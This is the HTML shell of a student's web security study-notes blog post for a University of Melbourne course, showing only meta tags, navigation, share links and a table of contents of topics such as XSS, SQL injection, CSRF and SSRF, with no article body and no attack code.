<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="COMP90074 Web Security ç½‘ç»œå®‰å…¨ åŸºç¡€ OWASP Top 10 web vulnerabilities (2017)  Injection Broken Authentication Sensitive Data Exposure XML External Entities (XEE) Broken Access Control Security Misconfigurat">
<meta property="og:type" content="article">
<meta property="og:title" content="COMP90074 ç½‘ç»œå®‰å…¨">
<meta property="og:url" content="https://yumtaro.com/archives/0.html/index.html">
<meta property="og:site_name" content="ZDZ">
<meta property="og:description" content="COMP90074 Web Security ç½‘ç»œå®‰å…¨ åŸºç¡€ OWASP Top 10 web vulnerabilities (2017)  Injection Broken Authentication Sensitive Data Exposure XML External Entities (XEE) Broken Access Control Security Misconfigurat">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/ZhidongZhou/gallery/master/img/iShot2022-03-03 15.18.01.png">
<meta property="article:published_time" content="2022-04-22T11:46:00.000Z">
<meta property="article:modified_time" content="2022-04-22T11:47:59.981Z">
<meta property="article:author" content="Darren Z">
<meta property="article:tag" content="unimelb">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/ZhidongZhou/gallery/master/img/iShot2022-03-03 15.18.01.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.jpg">
          
        
    
    <!-- title -->
    <title>COMP90074 ç½‘ç»œå®‰å…¨</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="stylesheet" href="/css/zdz.css" media="screen" type="text/css">
    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="ZDZ" type="application/atom+xml">
</head>


<body class="max-width mx-auto px3 ltr">    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/search/">ğŸ”</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/archives/99feb3ce.html/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yumtaro.com/archives/0.html/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yumtaro.com/archives/0.html/&text=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yumtaro.com/archives/0.html/&title=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yumtaro.com/archives/0.html/&is_video=false&description=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=COMP90074 ç½‘ç»œå®‰å…¨&body=Check out this article: https://yumtaro.com/archives/0.html/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yumtaro.com/archives/0.html/&title=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yumtaro.com/archives/0.html/&title=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yumtaro.com/archives/0.html/&title=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yumtaro.com/archives/0.html/&title=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yumtaro.com/archives/0.html/&name=COMP90074 ç½‘ç»œå®‰å…¨&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yumtaro.com/archives/0.html/&t=COMP90074 ç½‘ç»œå®‰å…¨"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#comp90074-web-security-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">COMP90074 Web Security
ç½‘ç»œå®‰å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">åŸºç¡€</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#owasp-top-10-web-vulnerabilities-2017"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">OWASP Top 10 web
vulnerabilities (2017)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#terminology"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">Terminology</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#permission-%E6%9D%83%E9%99%90"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">Permission æƒé™</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#html-events"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">HTML Events</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-cookies-%E4%BF%A1%E6%81%AF%E8%AE%B0%E5%BD%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">HTTP Cookies ä¿¡æ¯è®°å½•ç¨‹åº</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#domain-name-service-dns-%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">Domain Name Service (DNS)
åŸŸåæœåŠ¡ç³»ç»Ÿ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#asynchronous%E5%BC%82%E6%AD%A5-javascript-and-xml-ajax"><span class="toc-number">1.1.0.7.</span> <span class="toc-text">Asynchronouså¼‚æ­¥
JavaScript And XML (AJAX)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#document-object-model-dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.1.0.8.</span> <span class="toc-text">Document Object Model
(DOM) æ–‡æ¡£å¯¹è±¡æ¨¡å‹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-vs-csrf-vs-ssrf"><span class="toc-number">1.2.</span> <span class="toc-text">XSS vs CSRF vs SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#timing-attacks"><span class="toc-number">1.3.</span> <span class="toc-text">Timing Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit"><span class="toc-number">1.3.0.0.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-number">1.4.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#impact"><span class="toc-number">1.4.0.0.0.1.</span> <span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#remediation"><span class="toc-number">1.4.0.0.0.2.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stored-xss"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Stored XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-1"><span class="toc-number">1.4.0.1.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dom-based-xss"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">DOM-Based XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-2"><span class="toc-number">1.4.0.2.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-parameter-pollution-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">HTTP Parameter Pollution
å‚æ•°æ±¡æŸ“</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.4.0.3.0.1.</span> <span class="toc-text">å®šä¹‰</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tabnapping-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%88%86%E9%A1%B5%E7%BB%91%E6%9E%B6"><span class="toc-number">1.4.0.4.</span> <span class="toc-text">Tabnapping æµè§ˆå™¨åˆ†é¡µç»‘æ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-1"><span class="toc-number">1.4.0.4.0.1.</span> <span class="toc-text">å®šä¹‰</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-3"><span class="toc-number">1.4.0.4.0.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#impact-1"><span class="toc-number">1.4.0.4.0.3.</span> <span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#remediation-1"><span class="toc-number">1.4.0.4.0.4.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clickjacking-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><span class="toc-number">1.4.0.5.</span> <span class="toc-text">Clickjacking ç‚¹å‡»åŠ«æŒ</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#impact-2"><span class="toc-number">1.4.0.5.0.1.</span> <span class="toc-text">Impact</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#subdomain-takeovers"><span class="toc-number">1.4.0.6.</span> <span class="toc-text">Subdomain Takeovers</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli"><span class="toc-number">1.5.</span> <span class="toc-text">SQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E4%B8%A4%E7%A7%8Dcomment"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">SQLä¸¤ç§Comment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-injection-union-attacks"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">SQL
injection UNION attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#get-database-version"><span class="toc-number">1.5.0.2.0.1.</span> <span class="toc-text">Get Database Version</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-schema-name"><span class="toc-number">1.5.0.2.0.2.</span> <span class="toc-text">GET Schema Name</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-table-name"><span class="toc-number">1.5.0.2.0.3.</span> <span class="toc-text">Get Table Name</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-string-value"><span class="toc-number">1.5.0.2.0.4.</span> <span class="toc-text">Get String Value</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#retrieve-multiple-values-in-a-single-column"><span class="toc-number">1.5.0.2.0.5.</span> <span class="toc-text">Retrieve Multiple
Values in a Single Column</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#authentication-bypass-with-limit"><span class="toc-number">1.5.0.3.</span> <span class="toc-text">Authentication Bypass with
LIMIT</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-4"><span class="toc-number">1.5.0.3.0.1.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#mitigation"><span class="toc-number">1.5.0.3.0.2.</span> <span class="toc-text">Mitigation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-wildcard-attack"><span class="toc-number">1.5.0.4.</span> <span class="toc-text">SQL Wildcard Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-5"><span class="toc-number">1.5.0.4.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cross-site-request-forgery-%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-csrf"><span class="toc-number">1.6.</span> <span class="toc-text">Cross-Site
Request Forgery è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€  (CSRF)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#mitigation-1"><span class="toc-number">1.6.0.0.0.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-6"><span class="toc-number">1.6.0.0.0.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#server-side-request-forgery-ssrf-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">1.7.</span> <span class="toc-text">Server-Side
Request Forgery (SSRF) æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data-exfiltration-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">Data Exfiltration æ•°æ®æ³„éœ²</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-2"><span class="toc-number">1.7.0.1.0.1.</span> <span class="toc-text">å®šä¹‰</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%B3%84%E6%BC%8F%E7%9A%84dynamic-url-parameter%E5%8F%91%E8%B5%B7%E4%BC%AA%E9%80%A0%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82"><span class="toc-number">1.7.0.2.</span> <span class="toc-text">æ ¹æ®æ³„æ¼çš„Dynamic
URL &amp; Parameterå‘èµ·ä¼ªé€ æœåŠ¡ç«¯è¯·æ±‚</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-7"><span class="toc-number">1.7.0.2.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#remote-code-execution-rce-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">1.7.0.3.</span> <span class="toc-text">Remote Code
Execution (RCE) è¿œç¨‹æ‰§è¡Œä»£ç </span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#authorisation-vs-authentication"><span class="toc-number">1.8.</span> <span class="toc-text">Authorisation vs
Authentication</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialisation-vs-deserialisation"><span class="toc-number">1.9.</span> <span class="toc-text">Serialisation vs
Deserialisation</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        COMP90074 ç½‘ç»œå®‰å…¨
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ZDZ</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-04-22T11:46:00.000Z" itemprop="datePublished">22-04-2022</time>
        
      
    </div>


      <!-- è®¿é—®è®¡ç®— -->
      
    <div class="article-tag">
        <span id="/archives/0.html/" class="leancloud_visitors" data-flag-title="COMP90074 ç½‘ç»œå®‰å…¨">                    
            <span class="post-meta-item-icon">
            <i class="fa fa-eye"></i>
            </span>
            
            <span class="post-meta-item-text">Hits</span>
            <span class="leancloud-visitors-count"></span>
        </span>
    </div>

      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">å­¦ä¹ ç¬”è®°</a> â€º <a class="category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unimelb/">unimelb</a> â€º <a class="category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unimelb/MIT/">MIT</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/unimelb/" rel="tag">unimelb</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <!-- å¿…é¡»æ˜¾ç¤ºtoc -->
    <hr>
    <!-- <div id='toc'><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#comp90074-web-security-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">COMP90074 Web Security
ç½‘ç»œå®‰å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">åŸºç¡€</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#owasp-top-10-web-vulnerabilities-2017"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">OWASP Top 10 web
vulnerabilities (2017)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#terminology"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">Terminology</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#permission-%E6%9D%83%E9%99%90"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">Permission æƒé™</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#html-events"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">HTML Events</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-cookies-%E4%BF%A1%E6%81%AF%E8%AE%B0%E5%BD%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">HTTP Cookies ä¿¡æ¯è®°å½•ç¨‹åº</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#domain-name-service-dns-%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">Domain Name Service (DNS)
åŸŸåæœåŠ¡ç³»ç»Ÿ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#asynchronous%E5%BC%82%E6%AD%A5-javascript-and-xml-ajax"><span class="toc-number">1.1.0.7.</span> <span class="toc-text">Asynchronouså¼‚æ­¥
JavaScript And XML (AJAX)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#document-object-model-dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.1.0.8.</span> <span class="toc-text">Document Object Model
(DOM) æ–‡æ¡£å¯¹è±¡æ¨¡å‹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-vs-csrf-vs-ssrf"><span class="toc-number">1.2.</span> <span class="toc-text">XSS vs CSRF vs SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#timing-attacks"><span class="toc-number">1.3.</span> <span class="toc-text">Timing Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit"><span class="toc-number">1.3.0.0.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-number">1.4.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#impact"><span class="toc-number">1.4.0.0.0.1.</span> <span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#remediation"><span class="toc-number">1.4.0.0.0.2.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stored-xss"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Stored XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-1"><span class="toc-number">1.4.0.1.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dom-based-xss"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">DOM-Based XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-2"><span class="toc-number">1.4.0.2.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-parameter-pollution-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">HTTP Parameter Pollution
å‚æ•°æ±¡æŸ“</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.4.0.3.0.1.</span> <span class="toc-text">å®šä¹‰</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tabnapping-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%88%86%E9%A1%B5%E7%BB%91%E6%9E%B6"><span class="toc-number">1.4.0.4.</span> <span class="toc-text">Tabnapping æµè§ˆå™¨åˆ†é¡µç»‘æ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-1"><span class="toc-number">1.4.0.4.0.1.</span> <span class="toc-text">å®šä¹‰</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-3"><span class="toc-number">1.4.0.4.0.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#impact-1"><span class="toc-number">1.4.0.4.0.3.</span> <span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#remediation-1"><span class="toc-number">1.4.0.4.0.4.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clickjacking-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><span class="toc-number">1.4.0.5.</span> <span class="toc-text">Clickjacking ç‚¹å‡»åŠ«æŒ</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#impact-2"><span class="toc-number">1.4.0.5.0.1.</span> <span class="toc-text">Impact</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#subdomain-takeovers"><span class="toc-number">1.4.0.6.</span> <span class="toc-text">Subdomain Takeovers</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli"><span class="toc-number">1.5.</span> <span class="toc-text">SQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E4%B8%A4%E7%A7%8Dcomment"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">SQLä¸¤ç§Comment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-injection-union-attacks"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">SQL
injection UNION attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#get-database-version"><span class="toc-number">1.5.0.2.0.1.</span> <span class="toc-text">Get Database Version</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-schema-name"><span class="toc-number">1.5.0.2.0.2.</span> <span class="toc-text">GET Schema Name</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-table-name"><span class="toc-number">1.5.0.2.0.3.</span> <span class="toc-text">Get Table Name</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-string-value"><span class="toc-number">1.5.0.2.0.4.</span> <span class="toc-text">Get String Value</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#retrieve-multiple-values-in-a-single-column"><span class="toc-number">1.5.0.2.0.5.</span> <span class="toc-text">Retrieve Multiple
Values in a Single Column</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#authentication-bypass-with-limit"><span class="toc-number">1.5.0.3.</span> <span class="toc-text">Authentication Bypass with
LIMIT</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-4"><span class="toc-number">1.5.0.3.0.1.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#mitigation"><span class="toc-number">1.5.0.3.0.2.</span> <span class="toc-text">Mitigation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-wildcard-attack"><span class="toc-number">1.5.0.4.</span> <span class="toc-text">SQL Wildcard Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-5"><span class="toc-number">1.5.0.4.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cross-site-request-forgery-%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-csrf"><span class="toc-number">1.6.</span> <span class="toc-text">Cross-Site
Request Forgery è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€  (CSRF)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#mitigation-1"><span class="toc-number">1.6.0.0.0.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-6"><span class="toc-number">1.6.0.0.0.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#server-side-request-forgery-ssrf-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">1.7.</span> <span class="toc-text">Server-Side
